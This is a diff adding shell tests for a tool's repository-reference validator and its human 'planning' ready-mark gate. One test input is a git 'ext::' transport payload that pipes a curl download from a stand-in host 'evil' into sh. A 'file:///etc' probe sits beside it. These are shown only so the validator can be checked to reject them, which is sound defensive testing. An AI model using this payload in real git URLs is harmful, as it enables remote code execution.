@@ -72,6 +72,34 @@ check "field: rejects leading-dash value (option injection)" "2" "$?"
 check "field: rejected value falls back to main" \
   "main" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"
 
+# ---------- hero_normalize_repo_ref ----------------------------------------
+#
+# target-repo flows from HERO.md into `git ls-remote`/`git clone` as a URL.
+# hero_field blocks leading-dash/control-chars but NOT git's `ext::` transport
+# helper, which executes a shell command — the RCE this gate exists to stop.
+
+# The exploit shape: passes hero_field, must be rejected here.
+hero_normalize_repo_ref 'ext::sh -c "curl http://evil|sh"' >/dev/null 2>&1
+check "repo-ref: rejects ext:: transport helper (RCE)" "2" "$?"
+hero_normalize_repo_ref 'file:///etc' >/dev/null 2>&1
+check "repo-ref: rejects file:// transport" "2" "$?"
+hero_normalize_repo_ref 'ftp://host/x' >/dev/null 2>&1
+check "repo-ref: rejects unknown URL scheme" "2" "$?"
+hero_normalize_repo_ref 'no-such-dir/that/is/deep' >/dev/null 2>&1
+check "repo-ref: rejects a bare non-existent path" "2" "$?"
+
+# Accepted forms, normalized on stdout.
+check "repo-ref: OWNER/NAME expands to a github URL" \
+  "https://github.com/acme/widgets" "$(hero_normalize_repo_ref 'acme/widgets')"
+check "repo-ref: https URL passes through" \
+  "https://example.com/x.git" "$(hero_normalize_repo_ref 'https://example.com/x.git')"
+check "repo-ref: scp-style ssh passes through" \
+  "git@github.com:acme/widgets.git" "$(hero_normalize_repo_ref 'git@github.com:acme/widgets.git')"
+check "repo-ref: none passes through unchanged" \
+  "none" "$(hero_normalize_repo_ref none)"
+check "repo-ref: an existing local dir passes through" \
+  "$TMP/cfg" "$(hero_normalize_repo_ref "$TMP/cfg")"
+
 # ---------- hero_ready_items -----------------------------------------------
 
 W="$TMP/w/.plans"
@@ -271,6 +299,43 @@ discovered_from: 999
 EOF
 OUT8="$(hero_ready_items "$W" 2>/dev/null)"
 check "ready: dangling discovered_from never blocks" "READY" "$(state_of 020-disc.md "$OUT8")"
+
+# ---------- planning gate ----------------------------------------------------
+#
+# The planning state is the human ready-mark gate: emitted items sit in
+# `planning` until a person flips them to `todo`. Each case here pins a way the
+# gate could be silently defeated — an emitted item handed to one-shot with no
+# ready-mark, the precise silent-READY shape this table exists to catch.
+
+item 021-planning.md 21 "Awaiting ready-mark" "planning" "[1]"
+item 022-plandep.md 22 "Depends on a planning item" "todo" "[21]"
+cat > "$W/023-qplan.md" <<'EOF'
+---
+id: 23
+title: Quoted planning
+status: "planning"
+depends_on: []
+---
+EOF
+item 024-capplan.md 24 "Capitalized planning" "Planning" "[]"
+# `plan` is the display LABEL, `planning` the keyword — an intuitive-but-wrong
+# shortening that previously fell through to READY, defeating the whole gate.
+item 025-typo.md 25 "Status typo" "plan" "[1]"
+OUT9="$(hero_ready_items "$W" 2>/dev/null)"
+# Planning items list as `plan`, never READY, even with every dependency done.
+check "planning: item lists as plan, not READY" "plan"    "$(state_of 021-planning.md "$OUT9")"
+check "planning: quoted planning counts"        "plan"    "$(state_of 023-qplan.md "$OUT9")"
+check "planning: capitalized planning counts"   "plan"    "$(state_of 024-capplan.md "$OUT9")"
+# A dependent of a planning item stays blocked (the id EXISTS — it is just not
+# done — so this is ordinary blocking, NOT a dangling-ref).
+check "planning: dependent stays blocked"       "blocked" "$(state_of 022-plandep.md "$OUT9")"
+printf '%s' "$OUT9" | grep -q '022-plandep.md.*\[missing dep:'
+check "planning: dependent is not mislabeled dangling" "1" "$?"
+# An UNRECOGNIZED status (the `plan` typo) must be invalid, never READY.
+check "planning: unknown status is invalid, not READY" "invalid" "$(state_of 025-typo.md "$OUT9")"
+ERR9="$(hero_ready_items "$W" 2>&1 >/dev/null)"
+printf '%s' "$ERR9" | grep -q "unrecognized status 'plan'"
+check "planning: unknown status warns on stderr" "0" "$?"
 
 # ---------- hero_work_store migration ---------------------------------------
 #
